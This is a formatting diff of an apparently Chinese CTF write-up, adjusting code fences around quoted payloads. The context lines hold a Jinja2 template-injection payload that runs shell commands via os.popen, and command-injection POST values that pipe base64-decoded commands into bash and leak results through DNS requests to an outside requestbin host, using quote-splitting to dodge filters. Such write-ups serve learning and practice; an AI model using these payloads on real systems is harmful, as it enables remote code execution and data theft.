@@ -58,9 +58,9 @@ P3's girlfirend is : foo
 
 5. 贴一个官方的Payload：
 
-    
+    ```
     ?name={{ config.class.init.globals['os'].popen('ls /').read() }}
-    
+    ```
 
 {% endraw %}
 
@@ -153,7 +153,7 @@ POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /etc/demo/P3rh
     POST：girl_friend=php -r "system('ping '.substr(system('ec""ho YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg==|ba""se64 -d|bash'),0,50).'.f9a0ea65a00ba5753d08.d.dns.requestbin.buuoj.cn');"
     
     YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== => a=$(find / -name flag);echo ${a:10:15}|base64
-    ```
+```
 
 3. 不得不说，上面这个方法太蛋疼了，得整一个VPS工具。
 
